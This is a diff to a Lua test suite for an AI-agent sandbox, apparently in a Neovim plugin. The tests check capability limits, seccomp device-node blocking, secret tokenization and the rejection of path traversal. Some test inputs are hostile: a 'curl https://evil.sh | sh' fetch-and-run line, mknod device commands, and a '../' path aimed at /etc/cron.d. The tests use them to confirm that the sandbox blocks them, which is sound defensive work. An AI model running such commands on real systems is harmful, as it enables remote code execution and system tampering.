+    t.true_(r.ok, "应解析成功")
+    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_DAC_OVERRIDE"), "应加回 DAC_OVERRIDE")
+    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_CHOWN"), "应加回 CHOWN")
+    t.true_(not vim.tbl_contains(r.privileges.cap_add, "CAP_MKNOD"), "默认不应含 CAP_MKNOD（seccomp 另行硬拦设备节点）")
+    -- 混合命令（含非包管理器段）不加回：避免 cat/curl 继承 DAC_OVERRIDE/SETUID
+    local r2 = privilege.resolve(1, { tier = 1, package = true, package_all = false })
+    t.true_(not vim.tbl_contains(r2.privileges.cap_add, "CAP_DAC_OVERRIDE"), "混合命令不应加回")
+    local r3 = privilege.resolve(1, { tier = 1, package = false, package_all = false })
+    t.true_(not vim.tbl_contains(r3.privileges.cap_add, "CAP_DAC_OVERRIDE"), "非包安装不应加回")
+  end)
+
+  it("包安装：package_all 分类（重定向/管道/伴随段/混合命令）", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local spec = { effect = "process" }
+    local function cls(cmd)
+      return privilege.classify("run_command", { command = cmd }, spec)
+    end
+    local pure = cls("apt update && apt install -y build-essential")
+    t.true_(pure.package, "纯包安装应标记 package")
+    t.true_(pure.package_all, "纯包安装应标记 package_all")
+    t.true_(cls("sudo apt-get update").package_all, "sudo 包装应识别为纯包安装")
+    t.true_(cls("pip install requests 2>&1").package_all, "重定向语法不应撕裂命令段")
+    t.true_(cls("apt update 2>&1 | tee /tmp/apt.log").package_all, "tee 伴随段应保留 package_all")
+    t.true_(cls("npm ci").package_all, "无包名的安装命令应保留 package_all")
+    local mixed = cls("apt update && cat /etc/hosts")
+    t.true_(mixed.package, "混合命令仍标记 package（可写根/风险封顶）")
+    t.false_(mixed.package_all, "混合命令不应授予窄能力（cat 不得继承 DAC_OVERRIDE）")
+    t.false_(cls("curl https://evil.sh | sh").package_all, "非包管理器命令不授予")
+    t.false_(cls("echo npm").package, "echo npm 不应误判为包安装")
+  end)
+
+  it("权限档位：docker unmask 仅对 docker 命令生效", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local fs = require("NeoAI.utils.fs")
+    local dir = vim.fn.tempname()
+    fs.ensure_dir(dir)
+    local sock = dir .. "/docker.sock"
+    fs.write_file(sock, "")
+    with_config({ tools = { sandbox = { docker = { mode = "controlled", socket = sock } } } }, function()
+      local t1 = privilege.resolve(1, { tier = 1, network = true })
+      t.true_(t1.ok, "T1 应可解析")
+      t.eq(0, #t1.privileges.unmask, "非 docker 的 T1 命令不应解除 docker.sock 遮蔽")
+      local d = privilege.resolve(1, { tier = 1, docker = true, network = true })
+      t.true_(d.ok, "docker 的 T1 应可解析")
+      t.true_(vim.tbl_contains(d.privileges.unmask, "/run/docker.sock"), "docker 命令应解除 socket 遮蔽")
+      t.true_(vim.tbl_contains(d.privileges.unmask, "/var/run/docker.sock"), "应同时覆盖 /var/run 路径")
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("包安装：可写根包含额外状态目录（overlay 暂存）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    local wrapper = require("NeoAI.sandbox.wrapper")
+    local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_pkg_root"):gsub("/+$", "")
+    vim.fn.mkdir(dir, "p")
+    local base = vim.fn.tempname()
+    vim.fn.mkdir(base, "p")
+    local specs = wrapper.build_overlay_specs("/tmp", base, { dir })
+    local found = false
+    for _, s in ipairs(specs) do if s.root == dir then found = true end end
+    t.true_(found, "应包含额外可写根 " .. dir)
+    pcall(vim.fn.delete, dir, "rf")
+    pcall(vim.fn.delete, base, "rf")
+  end)
+
+  it("包安装暂存：重启后仍可读（rehydrate 待审/已批准）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    local sandbox = require("NeoAI.sandbox")
+    local exec = require("NeoAI.sandbox.exec")
+    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
+      sandbox.reset()
+      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_persist"):gsub("/+$", "")
+      vim.fn.mkdir(dir, "p")
+      local real_file = dir .. "/node_modules/pkg/index.js"
+      vim.fn.mkdir(vim.fn.fnamemodify(real_file, ":h"), "p")
+      pcall(os.remove, real_file)
+      local done = false
+      exec.run({ "bash", "-c", "echo PKG > " .. real_file }, {
+        name = "pkg", writable_roots = { dir }, network = false, timeout_ms = 20000,
+      }):then_(function() done = true end, function() done = true end)
+      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
+      -- 模拟重启：shutdown 清空暂存目录，init 从持久化候选重建。
+      sandbox.shutdown()
+      sandbox.init()
+      local staged = require("NeoAI.sandbox.candidate").read_path(real_file)
+      t.not_nil(staged, "重启后应能从候选重建暂存副本")
+      local f = io.open(staged)
+      local content = f and f:read("*a") or ""
+      if f then f:close() end
+      t.matches("PKG", content, "重启后暂存内容应保留")
+      pcall(vim.fn.delete, dir, "rf")
+    end)
+  end)
+
+  it("工具子进程：共享目录位于沙箱存储之外（不被强制遮蔽）", function(t)
+    local exec = require("NeoAI.sandbox.exec")
+    local store = require("NeoAI.sandbox.store")
+    local sr = exec.shared_root()
+    local root = (store.root() or ""):gsub("/+$", "")
+    t.true_(root ~= "" and sr ~= root and sr:sub(1, #root + 1) ~= root .. "/",
+      "共享目录不应位于沙箱存储内")
   end)
 
   it("加固：隐藏 /proc/cmdline 与 /proc/version", function(t)
@@ -914,7 +1506,7 @@ tests.suite("sandbox", function(_, it)
     fs.ensure_dir(home .. "/other")
     fs.write_file(home .. "/secret.txt", "s")
     fs.write_file(home .. "/.bash_history", "h")
-    with_config({ tools = { sandbox = { mask_dirs_enabled = true, mask_dirs = { "/home", "/root" } } } }, function()
+    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = true, mask_dirs = { "/home", "/root" } } } }, function()
       local prefix = runtime.process_prefix({ cwd = proj })
       t.not_nil(prefix, "应能构造前缀")
       local joined = table.concat(prefix, " ")
@@ -932,7 +1524,7 @@ tests.suite("sandbox", function(_, it)
       }), " ")
       t.true_(unmasked:find("--tmpfs " .. home .. "/other", 1, true) == nil, "获批条目应解除遮蔽")
     end)
-    with_config({ tools = { sandbox = { mask_dirs_enabled = false } } }, function()
+    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = false } } }, function()
       local joined = table.concat(runtime.process_prefix({ cwd = proj }), " ")
       t.true_(joined:find("--ro-bind /root /root", 1, true) == nil, "关闭后不应额外暴露 home")
       t.true_(joined:find("--tmpfs " .. home .. "/other", 1, true) == nil, "关闭后不应遮蔽 home")
@@ -951,7 +1543,7 @@ tests.suite("sandbox", function(_, it)
     local prev = vim.fn.getcwd()
     vim.fn.chdir(proj)
     with_config({ tools = { sandbox = {
-      mask_dirs_enabled = true, mask_dirs = { "/root" }, mask_dirs_approval = true,
+      read_all = false, mask_dirs_enabled = true, mask_dirs = { "/root" }, mask_dirs_approval = true,
     } } }, function()
       -- 1) 有审批界面：弹窗（stub）批准后放行读取
       local asked = nil
@@ -1260,7 +1852,8 @@ tests.suite("sandbox", function(_, it)
     }, function()
       sandbox.reset()
       local done = false
-      require("NeoAI.tools").execute("run_command", { command = "sudo id", description = "t" }, {})
+      -- 用真正的 T2 命令（sudo 已被剥离，不再触发 T2）。
+      require("NeoAI.tools").execute("run_command", { command = "mount --version", description = "t" }, {})
         :then_(function() done = true end, function() done = true end)
       t.true_(vim.wait(12000, function() return done end), "命令应完成")
       t.true_(#require("NeoAI.sandbox.hostop").list({}) >= 1, "T2 命令应冻结主机提案")
@@ -1382,6 +1975,49 @@ tests.suite("sandbox", function(_, it)
     secret.reset()
   end)
 
+  it("密钥防护：AI 上下文出现原始密钥时终止 Agent（token 不终止）", function(t)
+    local secret = require("NeoAI.sandbox.secret")
+    secret.reset()
+    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
+    local tok = secret.tokenize(fake)
+    t.true_(secret.has_token(tok), "应生成 token")
+    local recovery = require("NeoAI.core.agent.recovery")
+    local abort_reason
+    local agent = {
+      id = "a_ctx_secret",
+      signal = {
+        abort = function(_, r) abort_reason = r end,
+        reason = function() return abort_reason end,
+        aborted = function() return abort_reason ~= nil end,
+      },
+    }
+    -- 原始密钥出现在 AI 可见上下文（wire 消息）→ 终止整个 Agent
+    local ok, err = recovery._guard_secret_context(agent,
+      { { role = "assistant", content = "KEY=" .. fake } })
+    t.false_(ok, "上下文含原始密钥应被拒绝")
+    t.matches("SANDBOX_SECRET_BLOCKED", tostring(err and err.message or err))
+    t.eq("secret_exposure", abort_reason, "应终止整个 Agent")
+    -- token（KEY 环境变量操作）出现在上下文不终止
+    t.true_(recovery._guard_secret_context(agent,
+      { { role = "assistant", content = "KEY=" .. tok } }), "token 不应终止 Agent")
+    secret.reset()
+  end)
+
+  it("密钥防护：KEY 环境变量 token 操作只提级审批、不终止", function(t)
+    local secret = require("NeoAI.sandbox.secret")
+    secret.reset()
+    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
+    local tok = secret.tokenize(fake)
+    local ctx = {}
+    local done = false
+    require("NeoAI.tools").execute("read_file", {
+      filepath = "/nonexistent/" .. tok, description = "t",
+    }, ctx):then_(function() done = true end, function() done = true end)
+    t.true_(vim.wait(5000, function() return done end), "应完成")
+    t.eq(true, ctx.secret_operation, "token 操作应提级审批（secret_operation），而非终止")
+    secret.reset()
+  end)
+
   it("密钥防护：commit 发布时把 token 还原为真实密钥并留痕警告", function(t)
     local secret = require("NeoAI.sandbox.secret")
     local fs = require("NeoAI.utils.fs")
@@ -1471,6 +2107,59 @@ tests.suite("sandbox", function(_, it)
     local sha = "sha=a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"
     t.eq(sha, (secret.tokenize(sha)), "非敏感名不应被 token 化")
     secret.reset()
+  end)
+
+  it("密钥防护：代码表达式（NAME = os.getenv(...)）不被误判为原始密钥", function(t)
+    local secret = require("NeoAI.sandbox.secret")
+    secret.reset()
+    local code = table.concat({
+      "local function ai_config()",
+      '  local api_key = os.getenv("GIT_COMMIT_AI_API_KEY")',
+      "  if not api_key then return nil end",
+      "  return { api_key = api_key }",
+      "end",
+    }, "\n")
+    local out, used = secret.tokenize(code)
+    t.eq(code, out, "代码表达式不应被 token 化")
+    t.eq(0, #used, "不应产生 token")
+    t.nil_(secret.find_real_secret(code), "不应命中原始密钥（否则 edit_file 会被误终止）")
+    t.nil_(secret.scan({ edits = { { old_text = "x", new_text = code } } }).secret, "扫描参数不应命中")
+    -- 注释/文档中的 "Bearer token" 不应被当作凭据进入映射表
+    local doc = "-- Bearer token required for auth"
+    t.eq(doc, (secret.tokenize(doc)), "注释中的 Bearer 不应被 token 化")
+    t.nil_(secret.find_real_secret(doc), "注释不应进入映射表")
+    -- 真实 Bearer 凭据仍应被 token 化
+    local hdr = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV"
+    t.matches("NEOKEY_", (secret.tokenize(hdr)), "真实 Bearer 凭据应被 token 化")
+    secret.reset()
+  end)
+
+  it("密钥防护：敏感环境变量名出现只提级待审（不终止，带警告）", function(t)
+    local secret = require("NeoAI.sandbox.secret")
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    secret.reset()
+    with_config({ tools = { sandbox = { ephemeral_roots = {} } } }, function()
+    local code = 'local api_key = os.getenv("GIT_COMMIT_AI_API_KEY")\n'
+    local p = vim.fn.tempname() .. ".lua"
+    local ctx = {}
+    local done = false
+    require("NeoAI.tools").execute("edit_file", {
+      filepath = p, mode = "write", content = code, description = "t",
+    }, ctx):then_(function() done = true end, function() done = true end)
+    t.true_(vim.wait(10000, function() return done end), "edit_file 应完成")
+    t.eq(true, ctx.secret_operation, "应提级（secret_operation），而非终止")
+    t.true_(vim.tbl_contains(ctx.secret_names or {}, "GIT_COMMIT_AI_API_KEY"), "应记录敏感环境变量名")
+    local found
+    for _, it in ipairs(sandbox.list_reviews({ review_state = "PENDING" }) or {}) do
+      for _, f in ipairs(it.files or {}) do if f.path == p then found = it end end
+    end
+    t.not_nil(found, "应产生待审变更单元")
+    t.true_(found.secret_warning and (found.secret_warning.count or 0) > 0, "待审项应带密钥警告")
+    t.true_(#(found.secret_warning.names or {}) > 0, "警告应含敏感环境变量名")
+    fs.delete_file(p)
+    secret.reset()
+    end)
   end)
 
   it("密钥防护：环境变量 token 化注入可观测信号且可整体关闭", function(t)
@@ -1615,13 +2304,13 @@ tests.suite("sandbox", function(_, it)
     runtime.reset()
     runtime.probe()
     runtime.capabilities().overlayfs = true -- 模拟粗粒度探测假阳性
-    local orig = runtime.overlay_mountable
-    runtime.overlay_mountable = function() return false end
+    local orig = runtime.overlay_writable
+    runtime.overlay_writable = function() return false end
     local prefix, err = runtime.process_prefix({
       cwd = "/tmp", upper = "/tmp/neoai_ovl_u", work = "/tmp/neoai_ovl_w",
       fallback_cwd = "/tmp/neoai_ovl_f",
     })
-    runtime.overlay_mountable = orig
+    runtime.overlay_writable = orig
     t.not_nil(prefix, err)
     local joined = table.concat(prefix, " ")
     t.true_(joined:find("--bind", 1, true) ~= nil, "真实路径实测失败应降级为 --bind")
@@ -1828,6 +2517,41 @@ tests.suite("sandbox", function(_, it)
     end)
   end)
 
+  it("包安装按安装命令（package_key）合并为一个审批单元", function(t)
+    local sandbox = require("NeoAI.sandbox")
+    local review = require("NeoAI.sandbox.review")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
+      sandbox.reset()
+      local function mk(digest, path)
+        local cand = {
+          candidate_digest = digest, created_at = os.time(), effect = "process",
+          files = { { path = path, action = "create", after_hash = "h:" .. path, content = "x" } },
+        }
+        store.write_candidate(cand)
+        return cand
+      end
+      local meta = {
+        tool = "run_command", package = true, package_manager = "apt-get",
+        package_names = { "curl" }, package_key = "apt-get:curl",
+        risk_level = 2, command = "apt-get install -y curl",
+      }
+      local it1 = review.enqueue(mk("sha256:pk1", "/var/lib/apt/lists/a"), meta)
+      local it2 = review.enqueue(mk("sha256:pk2", "/var/lib/apt/lists/b"), meta)
+      t.not_nil(it1)
+      t.eq(it1.change_set_id, it2.change_set_id, "同安装命令应合并到同一变更单元")
+      local pending = sandbox.list_reviews({ review_state = "PENDING" })
+      t.eq(1, #pending, "合并后待审队列应只有一个包安装条目")
+      t.eq(2, #pending[1].files, "合并条目应包含两次安装的全部文件")
+      t.eq("apt-get", pending[1].package_manager, "应保留包管理器")
+      -- 合并键不同的包安装不合并
+      local it3 = review.enqueue(mk("sha256:pk3", "/var/lib/apt/lists/c"),
+        { tool = "run_command", package = true, package_key = "apt-get:wget", package_manager = "apt-get" })
+      t.not_nil(it3)
+      t.eq(2, #sandbox.list_reviews({ review_state = "PENDING" }), "不同安装命令应各占一个条目")
+    end)
+  end)
+
   it("run_command：文件改动在 overlay 私有层冻结为候选", function(t)
     local fs = require("NeoAI.utils.fs")
     local sandbox = require("NeoAI.sandbox")
@@ -1859,6 +2583,45 @@ tests.suite("sandbox", function(_, it)
         done = true
       end)
       t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
+    end)
+    vim.fn.chdir(prev)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("run_command：只读命令不重复捕获已暂存编辑（不取代/回滚）", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end -- overlay 仅 bwrap 后端
+    local dir = vim.fn.tempname()
+    fs.ensure_dir(dir)
+    fs.write_file(dir .. "/a.txt", "base\n")
+    local prev = vim.fn.getcwd()
+    vim.fn.chdir(dir)
+    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
+      sandbox.reset()
+      local function run(name, fn)
+        local done = false
+        fn(function() done = true end, function(e)
+          t.true_(false, name .. " 失败: " .. tostring(e and e.message or e)); done = true
+        end)
+        t.true_(vim.wait(10000, function() return done end), name .. " 应完成")
+      end
+      run("edit_file", function(ok, err)
+        require("NeoAI.tools").execute("edit_file",
+          { filepath = dir .. "/a.txt", description = "t", mode = "write", content = "changed\n" }, {}):then_(ok, err)
+      end)
+      run("read-only run_command", function(ok, err)
+        require("NeoAI.tools").execute("run_command",
+          { command = "ls -la; cat a.txt >/dev/null", description = "t" }, {}):then_(ok, err)
+      end)
+      local items = sandbox.list_reviews({ review_state = "PENDING" })
+      t.eq(1, #items, "只读命令不应额外产生候选")
+      t.eq("edit_file", items[1].tool, "待审项应仍为 edit_file 候选（未被只读命令取代）")
+      local staged = candidate.read_path(dir .. "/a.txt")
+      t.not_nil(staged, "暂存副本应仍存在")
+      t.matches("changed", fs.read_file(staged) or "", "暂存内容应保留编辑结果（未被回滚）")
     end)
     vim.fn.chdir(prev)
     vim.fn.delete(dir, "rf")
@@ -2367,6 +3130,53 @@ tests.suite("sandbox", function(_, it)
     end)
   end)
 
+  it("seccomp：设备节点屏障——mknod CHR/BLK 拒绝（即便完整 root 能力），FIFO 放行", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    local seccomp = require("NeoAI.sandbox.seccomp")
+    if runtime.backend() ~= "bwrap" then return end
+    if vim.fn.executable("mknod") ~= 1 or vim.fn.executable("mkfifo") ~= 1 then return end
+    -- 结构性：过滤器生成不报错（mknod/mknodat 的 mode 条件块已并入）
+    t.not_nil(seccomp.build_filter("x86_64"), "应能生成 x86_64 过滤器")
+    t.not_nil(seccomp.build_filter("aarch64"), "应能生成 aarch64 过滤器")
+    -- 实测：显式授予完整 root 能力（cap_add={"ALL"}，含 CAP_MKNOD）时，
+    -- 块/字符设备节点仍被 seccomp 拒绝（裸磁盘读通道封死）；FIFO/普通文件不受影响。
+    with_config({ tools = { approval = { mode = "async" }, sandbox = {
+      mode = "dry_run", cap_add = { "ALL" }, seccomp = { enabled = true },
+    } } }, function()
+      local sandbox = require("NeoAI.sandbox")
+      sandbox.reset()
+      seccomp.reset()
+      local done = 0
+      local function step(cmd, check)
+        require("NeoAI.tools").execute("run_command", { command = cmd, description = "t" }, {})
+          :then_(function(r)
+            check(tostring(r))
+            done = done + 1
+          end, function(e)
+            check("ERR:" .. tostring(e and e.message or e))
+            done = done + 1
+          end)
+      end
+      step("mknod /tmp/.sbx_blk b 8 0 && echo DEVICE_CREATED", function(out)
+        local low = out:lower()
+        t.true_(not low:find("device_created", 1, true), "块设备节点不应创建成功（实际: " .. out .. "）")
+        t.true_(low:find("not permitted", 1, true) ~= nil, "块设备应被 seccomp 拒绝（EPERM）")
+      end)
+      step("mknod /tmp/.sbx_chr c 1 3 && echo DEVICE_CREATED", function(out)
+        local low = out:lower()
+        t.true_(not low:find("device_created", 1, true), "字符设备节点不应创建成功（实际: " .. out .. "）")
+        t.true_(low:find("not permitted", 1, true) ~= nil, "字符设备应被 seccomp 拒绝（EPERM）")
+      end)
+      step("mkfifo /tmp/.sbx_fifo && echo FIFO_OK", function(out)
+        t.true_(out:find("FIFO_OK", 1, true) ~= nil, "FIFO 应不受设备节点屏障影响（实际: " .. out .. "）")
+      end)
+      t.true_(vim.wait(15000, function() return done >= 3 end), "mknod/mkfifo 测试应完成")
+      pcall(os.remove, "/tmp/.sbx_blk")
+      pcall(os.remove, "/tmp/.sbx_chr")
+      pcall(os.remove, "/tmp/.sbx_fifo")
+    end)
+  end)
+
   it("seccomp：clone 带命名空间标志被拒绝、clone3 返回 ENOSYS", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     if runtime.backend() ~= "bwrap" or vim.fn.executable("python3") ~= 1 then return end
@@ -2447,10 +3257,11 @@ tests.suite("sandbox", function(_, it)
     end)
   end)
 
-  it("加固：沙箱进程不持有 capability 且 seccomp 生效", function(t)
+  it("加固：默认最小权限（CapEff=0 + 收敛主机全局能力）+ seccomp；可显式放宽", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     if runtime.backend() ~= "bwrap" then return end
     local sandbox = require("NeoAI.sandbox")
+    -- 默认：最小权限（CapEff 全 0）且收敛主机全局能力；seccomp 生效。
     with_config({
       tools = {
         approval = { mode = "async" },
@@ -2458,17 +3269,57 @@ tests.suite("sandbox", function(_, it)
       },
     }, function()
       sandbox.reset()
-      local done = false
+      local done, out = false, nil
       require("NeoAI.tools").execute("run_command", {
         command = "grep -E 'CapEff|Seccomp:' /proc/self/status",
         description = "t",
       }, {}):then_(function(r)
-        local s = tostring(r)
-        t.matches("CapEff:%s*0+", s, "载荷不应持有任何 capability")
-        t.matches("Seccomp:%s*2", s, "应加载 seccomp 过滤器")
+        out = tostring(r)
         done = true
       end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
       t.true_(vim.wait(8000, function() return done end), "命令应完成")
+      t.matches("Seccomp:%s*2", out, "应加载 seccomp 过滤器")
+      t.true_(out:find("CapEff:%s*0+\n") ~= nil, "默认应为最小权限（无 capability）")
+    end)
+    -- 显式放宽：cap_add = { "ALL" } → 持有完整能力，seccomp 仍生效。
+    with_config({
+      tools = {
+        approval = { mode = "async" },
+        sandbox = { cap_add = { "ALL" }, mode = "dry_run", review = { enabled = true }, seccomp = { enabled = true } },
+      },
+    }, function()
+      sandbox.reset()
+      local done, out = false, nil
+      require("NeoAI.tools").execute("run_command", {
+        command = "grep -E 'CapEff|Seccomp:' /proc/self/status",
+        description = "t",
+      }, {}):then_(function(r)
+        out = tostring(r)
+        done = true
+      end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
+      t.true_(vim.wait(8000, function() return done end), "命令应完成")
+      t.true_(out:find("CapEff:%s*0*[1-9a-f]") ~= nil, "cap_add={ALL} 应持有完整 root 能力")
+      t.matches("Seccomp:%s*2", out, "应加载 seccomp 过滤器")
+    end)
+    -- 前缀级（最小权限模式下）：纯包安装按需加回窄能力；混合/普通命令不加回。
+    local privilege = require("NeoAI.sandbox.privilege")
+    local spec = { effect = "process" }
+    local function prefix_for(cmd)
+      local req = privilege.classify("run_command", { command = cmd }, spec)
+      local r = privilege.resolve(req.tier, req)
+      t.true_(r.ok, "应可解析: " .. cmd)
+      return table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = r.privileges }), " ")
+    end
+    with_config({ tools = { sandbox = { cap_add = {} } } }, function()
+      local pkg = prefix_for("apt-get install -y build-essential")
+      t.true_(pkg:find("--cap-drop ALL", 1, true) ~= nil, "包安装也应从最小权限起步")
+      t.true_(pkg:find("--cap-add CAP_DAC_OVERRIDE", 1, true) ~= nil, "纯包安装应按需加回窄能力")
+      local mixed = prefix_for("apt-get update && cat /etc/hosts")
+      t.true_(mixed:find("--cap-drop ALL", 1, true) ~= nil, "混合命令应保持最小权限")
+      t.true_(mixed:find("--cap-add", 1, true) == nil, "混合命令不应加回 capability（cat 不得继承 DAC_OVERRIDE）")
+      local plain = prefix_for("ls -la")
+      t.true_(plain:find("--cap-drop ALL", 1, true) ~= nil, "普通命令应最小权限")
+      t.true_(plain:find("--cap-add", 1, true) == nil, "普通命令不应加 capability")
     end)
   end)
 
@@ -2653,6 +3504,98 @@ tests.suite("sandbox", function(_, it)
       t.true_(vim.wait(20000, function() return done end), "热重载一致性检查应完成")
     end)
     vim.fn.chdir(prev)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("加固：发布前重规范化路径，拒绝 `..` 穿越与遮蔽目标", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local root = vim.fn.tempname()
+    fs.ensure_dir(root)
+    -- 中间组件 `ghost` 不存在：旧实现 `fnamemodify(:p)` 不折叠 `..`，会以「工作区内」路径入队，
+    -- 发布时才由内核解析到 root/pwned（工作区外）。现在应在发布前拒绝。
+    local evil = root .. "/ghost/../pwned"
+    local res = candidate.publish({
+      candidate_digest = "sha256:escape",
+      files = { { path = evil, action = "create", after_hash = "h", content = "PWN" } },
+    })
+    t.false_(res.ok, "非规范路径应拒绝")
+    t.eq("CONFLICT", res.state)
+    t.matches("PATH_CHANGED", tostring(res.reason))
+    t.false_(fs.exists(root .. "/pwned"), "不得写到解析后的真实位置")
+    -- 规范路径但命中宿主敏感遮蔽路径 → FAILED（纵深防御，防止落盘候选被篡改后发布）
+    local secret = root .. "/secret.env"
+    with_config({ tools = { sandbox = { mask_paths = { secret } } } }, function()
+      local res2 = candidate.publish({
+        candidate_digest = "sha256:masked",
+        files = { { path = secret, action = "create", after_hash = "h", content = "x" } },
+      })
+      t.false_(res2.ok, "遮蔽目标应拒绝")
+      t.eq("FAILED", res2.state)
+      t.matches("MASKED", tostring(res2.reason))
+    end)
+    vim.fn.delete(root, "rf")
+  end)
+
+  it("加固：风险分级与审批 UI 解析路径，`..` 不伪装成工作区", function(t)
+    local risk = require("NeoAI.sandbox.risk")
+    local review_ui = require("NeoAI.ui.components.sandbox_review")
+    local fs = require("NeoAI.utils.fs")
+    local dir = vim.fn.tempname()
+    fs.ensure_dir(dir)
+    local prev = vim.fn.getcwd()
+    vim.fn.chdir(dir)
+    -- 不存在的中间组件 + 多级 `..` 解析到工作区外系统路径
+    local evil = dir .. "/ghost/" .. ("../"):rep(20) .. "etc/cron.d/pwn"
+    t.eq(2, risk.path_level(evil), "解析后在工作区外应为系统级（旧实现误判为工作区 L0）")
+    t.eq("system", review_ui.level_of(evil), "审批 UI 应标为系统路径")
+    vim.fn.chdir(prev)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("策略：受限规则环境真正隔离（os/pcall 不可达）", function(t)
+    local policy = require("NeoAI.sandbox.policy")
+    with_config({ tools = { sandbox = { policy = { rules = {
+      function() return { decision = os.getenv and "ALLOW" or "DENY" } end,
+    } } } } }, function()
+      local v = policy.evaluate({ tool = "x", effect = "read" })
+      t.eq("DENY", v.decision, "os 不可达 → 规则报错 → DENY")
+      t.true_(vim.tbl_contains(v.reason_codes, "POLICY_EVALUATION_FAILED"))
+    end)
+    -- pcall 被移出白名单：无法用它吞掉指令预算的 hook error
+    policy.set_limits({ instruction_budget = 1000 })
+    with_config({ tools = { sandbox = { policy = { rules = {
+      function()
+        pcall(function() while true do end end)
+        return { decision = "ALLOW" }
+      end,
+    } } } } }, function()
+      local v = policy.evaluate({ tool = "x", effect = "read" })
+      t.eq("DENY", v.decision, "pcall 不可达，预算拦截无法被吞")
+    end)
+    policy.reset()
+  end)
+
+  it("seccomp：x86_64 过滤器含 x32 ABI 位拦截，aarch64 无", function(t)
+    local seccomp = require("NeoAI.sandbox.seccomp")
+    local function has_x32_guard(arch)
+      local f = seccomp.build_filter(arch)
+      -- BPF_JSET_K(0x45) jt=0 jf=1 k=0x40000000（小端）
+      return f ~= nil and f:find(string.char(0x45, 0, 0, 1, 0, 0, 0, 0x40), 1, true) ~= nil
+    end
+    t.true_(has_x32_guard("x86_64"), "x86_64 应拦截带 __X32_SYSCALL_BIT 的 syscall 号")
+    t.false_(has_x32_guard("aarch64"), "aarch64 无 x32 ABI")
+  end)
+
+  it("加固：候选存储目录权限收紧为 0700", function(t)
+    local store = require("NeoAI.sandbox.store")
+    local dir = vim.fn.tempname()
+    store.reset()
+    store.init(dir)
+    local st = vim.uv.fs_stat(dir .. "/candidates")
+    t.not_nil(st, "候选目录应存在")
+    t.eq(448, st.mode % 512, "候选目录权限应为 0700")
+    store.reset()
     vim.fn.delete(dir, "rf")
   end)
 end)
